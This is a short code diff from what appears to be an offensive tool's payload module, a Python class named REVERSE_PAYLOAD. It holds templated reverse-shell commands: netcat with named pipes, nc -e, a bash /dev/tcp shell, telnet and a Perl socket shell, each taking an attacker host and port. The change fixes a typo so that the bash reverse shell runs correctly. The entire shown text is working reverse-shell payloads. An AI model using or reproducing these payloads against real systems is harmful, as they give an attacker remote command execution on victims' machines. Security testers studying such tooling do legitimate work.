@@ -301,7 +301,7 @@ class REVERSE_PAYLOAD:
     NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""
     NC2 = """nc -e /bin/sh {0} {1}"""
     NC3 = """rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p"""
-    BASH = """bach -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
+    BASH = """bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
     BASH2 = """bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'"""
     TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
     PERL = """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
